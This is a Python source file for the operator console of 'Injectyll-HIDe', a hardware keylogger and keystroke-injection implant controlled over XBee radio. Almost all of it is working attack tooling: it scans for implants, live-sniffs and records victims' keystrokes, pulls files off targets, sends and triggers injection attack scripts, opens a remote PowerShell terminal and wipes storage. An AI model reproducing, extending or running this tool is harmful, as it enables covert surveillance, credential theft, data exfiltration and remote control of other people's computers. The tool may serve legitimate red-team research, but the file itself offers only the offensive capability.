#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#Copyright 2022 Jonathan Fischer and Jeremy Miller
#Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

import time, os, base64, gzip, io
import serial.tools.list_ports
from blessed import Terminal
from digi.xbee.devices import XBeeDevice, RemoteXBeeDevice, XBee64BitAddress
from os import path


def listToString(l):
    s = ""
    for i in range(len(l)):
        s = s + l[i]
    return s


def initiate_xbee_device():
    com = comMenu()
    baud = baudMenu()
    try:
        dev = XBeeDevice(com, baud)
        return dev
    except Exception:
        print("There was an error with the submitted settings\n")
        print("Please try again")
        time.sleep(5)
        exit()
        
        
def scanner(t, d):
    try:
        xnet = d.get_network()
        print("\nInitiating scanner.  Please wait for 10 seconds.\n")

        xnet.set_discovery_timeout(10)  
        xnet.start_discovery_process()
        while xnet.is_discovery_running():
            time.sleep(0.5)

        device_list = xnet.get_devices()

        if path.exists('attackNodes.txt'):
            os.remove('attackNodes.txt')
        f = open('attackNodes.txt', 'w')
        f.write('---' + t +'---\n')
        print("DigiMesh devices found:")
        for i in device_list:
            print(i)
            f.write(str(i)+'\n')
        f.close()
    except Exception as e:
        print("There was an error detected while scanning for targets")
    except KeyboardInterrupt:
        print("The user stopped the scanning process")

    
def comMenu():
    print("The available com ports are:")
    ports = serial.tools.list_ports.comports()
    count = 1
    com = []
    comData = []
    for port, desc, hwid in sorted(ports):
        print(str(count)+") {}: {}".format(port, desc))
        com.append(port)
        comData.append(desc)
        count = count + 1
    try:
        selection = int(input("\nSelect the com port that matches your Xbee device:")) - 1
        print("Selected com port: " + com[selection])
        return com[selection]
    except (KeyboardInterrupt, Exception) as e:
        print("There was an error with your selection.")
        print("The com port value will be set to " + com[0])
        
          
def baudMenu():
    print("\nChose your Baud Rate from the following options:")
    print("1)      300")
    print("2)     1200")
    print("3)     2400")
    print("4)     4800")
    print("5)     9600")
    print("6)    19200")
    print("7)    38400")
    print("8)    57600")
    print("9)    74880")
    print("10)  115200")
    print("11)  230400")
    print("12)  250000")
    print("13)  500000")
    print("14) 1000000")
    print("15) 2000000\n")
    speed = input("Chose your baud rate (1-15): ")
    if speed == '1':
        return('300')
    elif speed == '2':
        return('1200')
    elif speed == '3':
        return('2400')
    elif speed == '4':
        return('4800')
    elif speed == '5':
        return('9600')
    elif speed == '6':
        return('19200')
    elif speed == '7':
        return('38400')
    elif speed == '8':
        return('57600')
    elif speed == '9':
        return('74880')
    elif speed == '10':
        return('115200')
    elif speed == '11':
        return('230400')
    elif speed == '12':
        return('250000')
    elif speed == '13':
        return('500000')
    elif speed == '14':
        return('1000000')
    elif speed == '15':
        return('921600')
    else:
        print("The input was not a valid entry")
        print("The baud rate will be set by default to 9600")
        return('9600')
       

def target_rx(d, t):
    keyTerm = Terminal()
    userin=""
    blank=""
    name = t
    name += "-live_keys.txt"  
    # Instantiate a remote XBee device object.data
    remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
    #open file to save keystrokes, saved as "<targetName>-live_keys.txt"
    myFile = open(name, 'a')
    myFile.write("Beginning of recording: " + time.asctime(time.localtime(time.time())) + "\r")
    myFile.close()
    blank = ""
    inp = ""
    with keyTerm.cbreak(), keyTerm.hidden_cursor():
        print(keyTerm.home + keyTerm.clear)
        print("You are receiving keystrokes from Xbee: " + str(t))
        print("Press Esc to exit" + keyTerm.move_down(1))
        x = 0
        y = 4
        while True:
            try:    
                xbee_message = d.read_data_from(remote_device)
                if xbee_message:
                    msg = xbee_message.data
                    data = msg.decode().strip('\n')
                    if data == "[ENTER]":
                        y += 1
                        x = 0
                        print(keyTerm.move_xy(0,y) + "" + keyTerm.clear_eol)
                        inp = ""
                    elif data == "[BKSPC]":
                        blank = inp[:-1]
                        print(keyTerm.move_xy(0,y) + blank + keyTerm.clear_eol, end='')
                        loc = keyTerm.get_location(1)
                        inp = blank
                        x -= 1
                    else:
                        print(keyTerm.move_xy(x,y) + data + keyTerm.clear_eol)
                        x += len(data)
                        inp += data
                    myFile = open(name, 'a')
                    myFile.write(data.strip('\n')+'\r')
                    myFile.close()
                elif keyTerm.kbhit(0):
                    kIn = keyTerm.inkey()
                    if kIn.name == "KEY_ESCAPE":
                        myFile = open(name, 'a')
                        myFile.write("End of recording: " + time.asctime(time.localtime(time.time())) + "\r\r")
                        myFile.close()
                        break
            except (Exception) as e:
                print("An error was encountered connecting to the target. Returning back to the previous menu.")
                print(e)
                myFile = open(name, 'a')
                myFile.write("End of recording: " + time.asctime(time.localtime(time.time())) + "\r")
                myFile.close()
                break
            except (KeyboardInterrupt):
                print("The user aborted the receiving function")
                myFile = open(name, 'a')
                myFile.write("End of recording: " + time.asctime(time.localtime(time.time())) + "\r\r")
                myFile.close()
                break


def target_tx(d, a, m):
    try:
        remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(a))
        d.send_data(remote_device, m)
    except Exception as e:
        print("There was an error communicating with the desired Xbee.")
        print("If you are in a receiving mode, press Ctrl+C to exit it and return to the menu.")
        return False
    
    
def info(m):
    if path.exists('attackNodes.txt'):
        f = open('attackNodes.txt', 'r')
        for i in f:
            if str(m) in i:
                return i
        return m
    else:
        return m   


def target_list():
    print("\nTargets discovered on last scan:")
    count = 1
    if path.exists('attackNodes.txt'):
        f = open('attackNodes.txt', 'r')  
        target = []
        for i in f:
            if (str(i)[0] != '-' and str(i)[0] != '\n'):
                target.append(str(i)[0:16])
                print(str(count)+ ") " + str(i))
                count = count+1
    else:
        print("There are no targets recorded.")
        print("Please scan the network for available targets.")


def target_menu():
    print("\nPick your target:\n")
    print("0) Enter your own target address\n")
    count = 1
    if path.exists('attackNodes.txt'):
        f = open('attackNodes.txt', 'r')  
        target = []
        for i in f:
            if (str(i)[0] != '-' and str(i)[0] != '\n'):
                target.append(str(i)[0:16])
                print(str(count)+ ") " + str(i))
                count = count+1
        option = input("Choose target: ")
        if (option == '0'):
            return (input("Enter target address (e.g. 0013A20040XXXXXX): "))
        else:
            try:
                return target[int(option)-1]
            except Exception:
                print("There was an error with your selection.")
                print("Please try again")
                return(option)
    else:
        print("A target list has not yet been created.")
        print("Please scan for targets and try again.")
    

def main_menu():
    print("")
    print("------Main Menu------")
    print("")
    print("Options:")
    print("1)  List available targets")
    print("2)  Scan for Implants")
    print("3)  Activate Implants")
    print("4)  Get implant information")
    print("5)  Sniff keystrokes")
    print("6)  Enable Insomnia mode")
    print("7)  Disable Insomnia mode")
    print("8)  Enable Keystroke Recorder")
    print("9)  Disable Keystroke Recorder")
    print("10) Download keystroke record")
    print("11) Self-destruct mode")
    print("12) Get file list from target")
    print("13) Receive data file")
    print("14) Launch attack from script")
    print("15) Send attack script")
    print("16) Connect to Interactive Powershell Terminal")
    print("17) Delete a file on target implant")
    print("18) Reset target implant")
    print("19) Exit\n")


def submenu_sniff(d, t, m_enable, m_disable):
    target = target_menu()
    try:
        #send password to enable keystroke tx and rx data
        print("\nTarget: " + target)
        print("Press Ctrl+C to stop sniffing keystrokes\n")
        #tell the implant to start sending keystrokes
        target_tx(d,target, m_enable)
        #go into listening mode to receive keystrokes
        target_rx(d, target)
        #disable transmission of keystrokes
        target_tx(d,target, m_disable)
        myFile.write("Ending of recording: " + time.asctime(time.localtime(time.time())))
        myFile.close()
    except Exception as e:
        print("There was a communication issue with the desired target")
        
        
def submenu_toggle(d, m1, m2, m_out):
    print("\n\n1) " + m1)
    print("2) " + m2 + '\n')
    option = input("Choose function: ")
    if option == '1':
        print("\nSending broadcast message")
        #broadcast password to trigger keystroke transmission
        d.send_data_broadcast(m_out)
    elif option == '2':
        target = target_menu()
        try:
            print("\nTarget: " + target)
            print("\nSending message")
            target_tx(d,target, m_out)
        except Exception:
            print("There was an error with the submitted address")
            print("Please try again")
    else:
        print("Invalid selection.  Please try again!")
              

def submenu_rx_file(d,p):
    print("Choose which device to receive file from.")
    t = target_menu()
    #Will set exfil to true
    target_tx(d,t, p)
    nameRemote = input("Enter file name with extension to get (FULL PATH): ")
    #Send name of full path to get
    name = input("Enter file name with extension to be saved locally: ")
    target_tx(d,t, nameRemote)
    
    exfilData = []
    while True:
        try:
            d.set_sync_ops_timeout(8)
            remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg = xbee_message.data
                msg = msg.replace(b'\x7E', b'')
                data1 = msg.decode()
                time.sleep(1)
                print("This is what I got: "+data1)
                if data1 != "<<<EOF>>>":

                    if data1 == "@":
                        d.send_data(remote_device, "P")
                        print("ok sending ACK to continue")
                    else:
                        print("Nice got it!")
                        d.send_data(remote_device, "P")
                        exfilData.append(msg)
                        str3 = b''.join(exfilData)
                        print(str3)

                else:
                    f = open(name, 'wb')
                    str1 = b''.join(exfilData)
                    str2 = str1.replace(b'\x40', b'')
                    decoded = base64.b64decode(str2)
                    data3 = gzip.decompress(decoded)
                    f.write(data3)
                    print("Works!")
                    f.close()
                    
                    break
        except (KeyboardInterrupt, Exception) as e:
            print(e)
            target_tx(d, t, "<<EXFIL_OFF_PASSWORD>>")
            print("User either stopped the process or there was an error.")
            print(e)
            break


def submenu_send_file(d,p):
    print("Choose which device to send file to:")
    t = target_menu()
    filepath = input("Enter full file path: ")
    name = input("Enter desired file name with extension: ")
    try:
        if not os.path.isfile(filepath):
            print("File path does not exist")
            return
        #send command to receive attack script
        target_tx(d, t, p)
        time.sleep(1.0)
        #send script name to write
        target_tx(d, t, name)
        time.sleep(1.0)
        f = open(filepath, 'r')
        lines = f.readlines()
        for line in lines:
            sendLine = line.strip()
            target_tx(d, t, sendLine)
            time.sleep(1.0)
        time.sleep(2.0)
        target_tx(d, t, "EOF")
        f.close()
    except (KeyboardInterrupt, Exception) as e:
        print("User either stopped the process or there was an error.")
    

def terminal(d, p):
    t = target_menu()
    term = Terminal()
    target_tx(d,t, p)
    remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
    userin=""
    blank=""
    try:
        with term.cbreak(), term.hidden_cursor():
            print(term.home + term.clear)
            print("You are now connected to Xbee: " + str(info(t)))
            print("Press Esc to exit, Enter to transmit input" + term.move_down(1))
            #cursor location should now be (y,x) of (4,0)
            x = 0
            y = 4
            msgRx = False
            while True:
                xbee_message = d.read_data_from(remote_device)
                
                if xbee_message:
                    msg=xbee_message.data
                    data=msg.decode()
                    if data[0] == "~":
                        data1 = data[1:]
                        print(data1,end='')
                    else:
                        print(data,end='')
                    msgRx = True
                elif term.kbhit(0):
                    inp = term.inkey()
                    if msgRx:
                        val = term.get_location()
                        y = val[0]
                        msgRx = False
                    if inp.is_sequence:
                        if inp.name == "KEY_ENTER":
                            userin = userin+ "<<ENDD>>"+ "\r\n"
                            target_tx(d,t,userin)
                            y=y+1
                            x=0
                            y = y+1
                            userin = ""
                        elif inp.name == "KEY_ESCAPE":
                            break
                        elif inp.name == "KEY_BACKSPACE" or inp.name == "KEY_DELETE":
                            l = list(userin)
                            x = x-1
                            userin = ""
                            for i in range(len(l)-1):
                                userin = userin + l[i]
                            print(term.move_xy(0,y) + userin + term.clear_eol)
                    else:
                        userin = userin + inp
                        print(term.move_xy(x,y) + inp)
                        x = x+1
    except (Exception, KeyboardInterrupt) as e:
        print(e)
        target_tx(d, t, "<<TERMINAL_OFF_PASSWORD>>")
                    
def submenu_getModes(d, p):
    try:
        t = target_menu()
        target_tx(d, t, p)
        print("")
        remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
        while True:
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg=xbee_message.data
                data=msg.decode()
                if data != "<<<End of Message>>>\r\n":
                    print(data)
                else:
                    break
    except (Exception, KeyboardInterrupt) as e:
        print(e)

                
def submenu_fileSelect(d, p, o):   
    try:
        t = target_menu()
        name = t
        name += "_keys.txt"
        scripts = []
        target_tx(d, t, p)
        print("")
        skip = False
        remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
        #get list of available targets
        while True:
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg=xbee_message.data
                data=msg.decode()
                if data != "<<<End of Message>>>\r\n":
                    data = data.strip('\r\n')
                    scripts.append(data.strip('/'))
                    if data == "There was an error reading the submitted name":
                        #skip the menu print out
                        skip = True
                        print(data+"\r\n")
                        break
                else:
                    break
                    
        #skip the rest of the functions if there were no scripts detected
        if (len(scripts) < 1):
            print("There were no files detected")
            skip = True
            target_tx(d, t, "<<<Abort>>>")

        #print list of targets if not skip is not true    
        if skip == False:
            count = 0
            print("Available Files:")
            for i in scripts:
                print(str(count + 1)+ ") " + scripts[count])
                count = count+1
            option = int(input("\r\nChoose target: ")) - 1
            print("")
            try:
                target_tx(d, t, scripts[option])
            except Exception:
                print("There was an error with your selection.")
                print("Please try again")
        
            #receive in data and save to file if o == "rx"
            if (o == "rx"):
                while True:
                    try:
                        remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
                        xbee_message = d.read_data_from(remote_device)
                        f = open(name, 'a')
                        if xbee_message:
                            print("Incoming Message")
                            msg=xbee_message.data
                            data=msg.decode()
                            if (data) != "<<<EOF>>>\r\n":
                                f.write(data.strip('\n'))
                            else:
                                f.close()
                                break
                    except (KeyboardInterrupt, Exception) as z:
                        print("User either stopped the process or there was an error.")
                        print(z)
                        f.close()
                        break
    except (Exception, KeyboardInterrupt) as e:
        print(e)

    
def listFiles(d, p):
    try:
        t = target_menu()
        target_tx(d, t, p)
        print("\r\nFiles on target implant:")
        files = []
        remote_device = RemoteXBeeDevice(d, XBee64BitAddress.from_hex_string(t))
        #get list of available targets
        while True:
            xbee_message = d.read_data_from(remote_device)
            if xbee_message:
                msg=xbee_message.data
                data=msg.decode()
                if data != "<<<End of Message>>>\r\n":
                    data = data.strip('\r\n')
                    files.append(data.strip('/'))
                    print(data.strip('/'))
                    if data == "There was an error reading the submitted name":
                        print(data+"\r\n")
                        break
                else:
                    break                  
        #if there were no files detected
        if (len(files) < 1):
            print("There were no files detected")
            target_tx(d, t, "<<<Abort>>>")
    except (Exception, KeyboardInterrupt) as e:
        print(e)


def banner():
    print(" ______                                          __                __  __          __    __  ______  _______            ")
    print("/      |                                        /  |              /  |/  |        /  |  /  |/      |/       \           ")
    print("$$$$$$/  _______       __   ______    _______  _$$ |_    __    __ $$ |$$ |        $$ |  $$ |$$$$$$/ $$$$$$$  |  ______  ")
    print("  $$ |  /       \     /  | /      \  /       |/ $$   |  /  |  /  |$$ |$$ | ______ $$ |__$$ |  $$ |  $$ |  $$ | /      \ ")
    print("  $$ |  $$$$$$$  |    $$/ /$$$$$$  |/$$$$$$$/ $$$$$$/   $$ |  $$ |$$ |$$ |/      |$$    $$ |  $$ |  $$ |  $$ |/$$$$$$  |")
    print("  $$ |  $$ |  $$ |    /  |$$    $$ |$$ |        $$ | __ $$ |  $$ |$$ |$$ |$$$$$$/ $$$$$$$$ |  $$ |  $$ |  $$ |$$    $$ |")
    print(" _$$ |_ $$ |  $$ |    $$ |$$$$$$$$/ $$ \_____   $$ |/  |$$ \__$$ |$$ |$$ |        $$ |  $$ | _$$ |_ $$ |__$$ |$$$$$$$$/ ")
    print("/ $$   |$$ |  $$ |    $$ |$$       |$$       |  $$  $$/ $$    $$ |$$ |$$ |        $$ |  $$ |/ $$   |$$    $$/ $$       |")
    print("$$$$$$/ $$/   $$/__   $$ | $$$$$$$/  $$$$$$$/    $$$$/   $$$$$$$ |$$/ $$/         $$/   $$/ $$$$$$/ $$$$$$$/   $$$$$$$/ ")
    print("                /  \__$$ |                              /  \__$$ |                                                      ")
    print("                $$    $$/                               $$    $$/                                                       ")
    print("                 $$$$$$/                                 $$$$$$/                                                        \n")
    print("\n")
    print("Injectyll-HIDe version 0.99")
    print("Created on: 4-27-21")
    print("Created by Jonathan Fischer and Jeremy Miller\n\n")


def loop():
    localtime = time.asctime(time.localtime(time.time()))
    banner()
    device = initiate_xbee_device()
    device.open()

    while True:
        main_menu()
        try:
            option = input("Choose your function: ")
        except (KeyboardInterrupt, Exception):
            print("\n\nExiting Injectyll-HIDe\n")
            device.close()
            exit()

        if option == '0':
            print("\n\nEnter Option #19 to exit Injectyll-HIDe\n")
        elif option == '1':
            target_list()
        elif option == '2':
            scanner(localtime, device)
        elif option == '3':
            #password for activating implant functions
            submenu_toggle(device, "Activate all implants", "Activate target implant", "<<ACTIVATE_PASSWORD>>")
        elif option == '4':
            #password for retrieving the status of insomnia and key recorder modes
            submenu_getModes(device, "<<STATUS_PASSWORD>>")
        elif option == '5':
            #password for keystroke tx
            submenu_sniff(device, localtime, "<<TX1_PASSWORD>>", "<<TX2_PASSWORD>>")
        elif option == '6':
            #password for Enable insomnia
            submenu_toggle(device, "Cause global insomnia", "Cause targeted insomnia", "<<INSOMNIA_PASSWORD>>")
        elif option == '7':
            #password for Disable insomnia
            submenu_toggle(device, "Cure global insomnia", "Cure targeted insomnia", "<<DISABLE_INSOMNIA_PASSWORD>>")
        elif option == '8':
            #password for Enable Recording
            submenu_toggle(device, "Record keystrokes on all devices", "Record keystrokes on target device", "<<RECORDING_PASSWORD>>")
        elif option == '9':
            #password for Disable Recording
            submenu_toggle(device, "Disable recording on all devices", "Disable recording on target", "<<DISABLE_RECORDING_PASSWORD>>")
        elif option == '10':
            #password for downloading keystroke record file
            submenu_fileSelect(device, "<<DOWNLOAD_KEYSTROKE_PASSWORD>>","rx");
        elif option == '11':
            #password for Enabling wipe
            submenu_toggle(device, "Wipe all SD Cards", "Wipe SD Card at target address", "<<WIPESD_PASSWORD>>")
        elif option == '12':
            #password to retrieve file list from target
            listFiles(device, "<<GET_SD_PASSWORD>>")    
        elif option == '13':
            #password for data exfil
            submenu_rx_file(device, "<<EXFIL_PASSWORD>>")
        elif option == '14':
            #password for Enabling key injection
            submenu_fileSelect(device, "<<KEY_INJECTION_PASSWORD>>", "no")
        elif option == '15':
            #password for transferring over an attack script
            submenu_send_file(device, "<<SEND_INJECT_PASSWORD>>")
        elif option == '16':
            print("turning on terminal!")
            terminal(device, "<<TERMINAL_PASSWORD>>")
        elif option == '17':
            #password for deleting a file from SD card
            submenu_fileSelect(device, "<<DELETE_FILE_PASSWORD>>","delete")
        elif option == '18':
            #password for resetting all toggle variables in implant
            submenu_toggle(device, "Reset all devices", "Reset target device", "<<RESET_IMPLANT>>")
        elif option == '19':
            device.close()
            exit()
        else:
            print("\nYou did not choose a valid option")


if __name__ == '__main__':
    loop()
